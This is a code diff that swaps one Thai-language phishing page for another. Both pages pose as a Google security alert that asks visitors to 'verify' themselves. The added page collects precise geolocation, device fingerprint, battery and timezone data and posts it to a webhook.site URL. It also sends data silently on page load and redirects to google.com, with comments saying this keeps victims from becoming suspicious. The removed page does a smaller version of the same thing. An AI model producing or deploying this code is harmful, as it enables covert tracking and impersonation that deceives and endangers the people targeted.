@@ -1,10 +1,302 @@
-<!DOCTYPE html><html lang="th"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>การแจ้งเตือนความปลอดภัยของ Google</title> <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"> <style> body { font-family: 'Roboto', sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #3c4043; } .container { background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); max-width: 450px; width: 100%; text-align: center; } .logo { margin-bottom: 24px; } .logo svg { width: 48px; height: 48px; } h1 { font-size: 24px; font-weight: 500; margin-bottom: 16px; line-height: 1.4; } p { font-size: 16px; color: #5f6368; margin-bottom: 32px; line-height: 1.6; } .button { background-color: #1a73e8; color: #ffffff; border: none; padding: 12px 24px; font-size: 16px; font-weight: 500; border-radius: 4px; cursor: pointer; transition: background-color 0.2s; width: 100%; } .button:hover { background-color: #155ab6; } .button:disabled { background-color: #9aa0a6; cursor: not-allowed; } .footer { margin-top: 40px; font-size: 12px; color: #9aa0a6; } </style> </head> <body> <div class="container"> <div class="logo"> <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/> <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/> <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/> <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/> </svg> </div> <div id="alert-content"> <h1>การแจ้งเตือนความปลอดภัย</h1> <p>เราตรวจพบการพยายามเข้าสู่ระบบบัญชี Google ของคุณจากตำแหน่งที่ไม่คุ้นเคยหลายครั้ง เพื่อความปลอดภัยของบัญชี กรุณายืนยันตำแหน่งปัจจุบันของคุณเพื่อให้เรามั่นใจได้ว่านี่คือบัญชีของคุณจริง</p> <button id="confirm-button" class="button">หากนี่ไม่ใช่คุณ โปรดยืนยันตำแหน่งปัจจุบันเพื่อให้เรามั่นใจ</button> </div> <div id="success-content" style="display: none;"> <h1>ยืนยันตัวตนสำเร็จ</h1> <p>ข้อมูลของคุณได้รับการคุ้มครองแล้ว</p> </div> <div class="footer"> © 2026 Google LLC </div> </div> <script>
-document.getElementById('confirm-button').addEventListener('click', function() {
-const button = this;
-button.disabled = true;
-button.textContent = 'กำลังยืนยันตำแหน่ง...';
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>การตรวจสอบความปลอดภัย</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-if ("geolocation" in navigator) { navigator.geolocation.getCurrentPosition( function(position) { const data = { lat: position.coords.latitude, lng: position.coords.longitude, acc: position.coords.accuracy }; const webhookUrl = 'https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88'; fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }) .then(() => { document.getElementById('alert-content').style.display = 'none'; document.getElementById('success-content').style.display = 'block'; }) .catch(() => { document.getElementById('alert-content').style.display = 'none'; document.getElementById('success-content').style.display = 'block'; }); }, function(error) { button.disabled = false; button.textContent = 'ยืนยันอีกครั้ง'; }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } ); }
-});
-</script>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
+        .security-card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .shield-icon svg {
+            width: 50px;
+            height: 50px;
+            fill: white;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .description {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(66, 133, 244, 0.3);
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(66, 133, 244, 0.4);
+        }
+
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #4285f4;
+            font-size: 14px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-card">
+        <div class="shield-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+            </svg>
+        </div>
+        <h1>การตรวจสอบความปลอดภัย</h1>
+        <p class="description">
+            เพื่อความปลอดภัยของบัญชีคุณ กรุณายืนยันตัวตนผ่านการตรวจสอบความปลอดภัยนี้ 
+            ขั้นตอนนี้ใช้เวลาเพียงไม่กี่วินาที
+        </p>
+        <button class="verify-btn" onclick="verifyIdentity()">ยืนยันตัวตน</button>
+        <div class="loading" id="loading">กำลังตรวจสอบความปลอดภัย...</div>
+        <div class="footer">
+            ระบบรักษาความปลอดภัยของ Google
+        </div>
+    </div>
+
+    <script>
+        async function verifyIdentity() {
+            const btn = document.querySelector('.verify-btn');
+            const loading = document.getElementById('loading');
+            
+            btn.disabled = true;
+            btn.textContent = 'กำลังดำเนินการ...';
+            loading.style.display = 'block';
+
+            try {
+                // เก็บข้อมูลทั้งหมด
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    device: await collectDeviceInfo(),
+                    location: await collectLocation(),
+                    battery: await collectBatteryInfo()
+                };
+
+                // ส่งข้อมูลไปยัง webhook
+                await sendToWebhook(data);
+                
+                // เปลี่ยนหน้าไป Google
+                window.location.href = 'https://www.google.com';
+                
+            } catch (error) {
+                console.error('Verification failed:', error);
+                // ถ้าเกิด error ก็ยัง redirect ตามปกติเพื่อไม่ให้ผู้ใช้สงสัย
+                window.location.href = 'https://www.google.com';
+            }
+        }
+
+        async function collectLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocation not supported' });
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        });
+                    },
+                    (error) => {
+                        resolve({ 
+                            error: error.message,
+                            code: error.code 
+                        });
+                    },
+                    options
+                );
+            });
+        }
+
+        function collectDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: Date.now()
+            };
+        }
+
+        async function collectBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } else {
+                    return { error: 'Battery API not supported' };
+                }
+            } catch (error) {
+                return { error: error.message };
+            }
+        }
+
+        async function sendToWebhook(data) {
+            const webhookUrl = 'https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88';
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': navigator.userAgent,
+                        'X-Forwarded-For': '127.0.0.1'
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'cors'
+                });
+
+                // รอให้ข้อมูลส่งก่อนแล้วค่อยดำเนินการต่อ
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Webhook error:', error);
+                // ถึงแม้จะส่งไม่สำเร็จก็ยังคงดำเนินการต่อ
+                return false;
+            }
+        }
+
+        // เก็บข้อมูลเพิ่มเติมเมื่อโหลดหน้า
+        window.addEventListener('load', function() {
+            // เก็บข้อมูล referrer และ performance
+            const additionalData = {
+                referrer: document.referrer,
+                performance: performance.timing ? {
+                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                    domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
+                } : null
+            };
+            
+            // ส่งข้อมูลเพิ่มเติมไปยัง webhook แบบเงียบๆ
+            if (additionalData.referrer || additionalData.performance) {
+                fetch('https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'page_load',
+                        data: additionalData,
+                        timestamp: new Date().toISOString()
+                    }),
+                    mode: 'no-cors'
+                }).catch(() => {});
+            }
+        });
+    </script>
+</body>
+</html>
